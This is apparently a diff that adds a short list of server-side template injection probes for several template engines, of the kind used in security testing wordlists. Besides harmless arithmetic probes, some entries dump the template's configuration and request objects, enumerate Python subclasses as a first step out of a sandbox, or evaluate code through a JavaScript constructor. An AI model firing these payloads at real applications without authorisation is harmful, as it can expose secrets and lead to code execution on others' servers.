@@ -1,0 +1,15 @@
+# SSTI probes (framework-agnostic; handle with care)
+{{7*7}}
+{{"a".__class__}}
+{{request}}
+{{config}}
+{{self}}
+#{7*7}
+${7*7}
+${{7*7}}
+<%= 7*7 %>
+*{7*7}
+{{().__class__.__mro__[1].__subclasses__()}}
+{{constructor.constructor('return 7*7')()}}
+
+
